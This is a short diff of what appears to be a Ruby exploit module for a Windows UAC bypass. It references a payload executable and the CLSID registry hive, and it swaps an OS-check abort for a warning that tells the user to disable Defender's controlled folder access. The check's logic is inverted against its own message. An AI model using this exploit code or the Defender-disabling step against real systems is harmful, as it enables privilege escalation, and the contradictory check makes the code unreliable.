@@ -161,11 +161,17 @@ def run
     # check for proper operating system (windows 10)
     #
     if not sysinfo['OS'] =~ /Windows 10/
-      print_error("[ ABORT ]: This module only works againt windows 10 systems")
-      return nil
+      print_warning("windows 10 version its protected againts this exploit ...")
+      print_line("---------------------------------------------------------")
+      print_line("Disable 'access controled to folders' in windows defender")
+      print_line("If you wish to teste this on windows 10 version distros")
+      print_line("---------------------------------------------------------")
+      print_line("")
+      Rex::sleep(1.5)
     end
 
 
+  # variable declarations ..
   app_path = datastore['APP_PATH'] # /root/payload.exe
   fol_path = datastore['FOLDER_PATH'] # C:\\Users\<username>\Desktop\POC
   hive_key = "HKCU\\Software\\Classes\\CLSID" # uac hive key (CLSID)
